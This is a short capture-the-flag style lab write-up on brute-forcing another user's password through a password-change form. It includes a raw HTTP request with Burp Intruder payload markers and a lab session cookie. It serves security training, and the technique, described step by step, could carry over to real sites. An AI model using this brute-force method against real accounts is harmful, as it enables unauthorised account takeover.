# Lab: Password brute-force via password change
## Description



## Solution
1. Login using `wiener`
2. Submit the change password form with invalid data and send that request to Burp Intruder.
3. Use Burp Intruder to brute force the current-password field (using a valid authenticated session):
```yaml
POST /my-account/change-password HTTP/1.1
Host: ac4e1fa61fefe6d2c0ad2c0d007c00e8.web-security-academy.net
Cookie: session=ZN6X4LvbzjeYeI8HmbiZaKPaTcmn2Ivb
Content-Length: 94
Content-Type: application/x-www-form-urlencoded

username=carlos&current-password=§asdasdasdas§&new-password-1=qweqweqwe&new-password-2=zxczxczxc
```
4. Look for changes in the response lenght to find the correct password for Carlos.
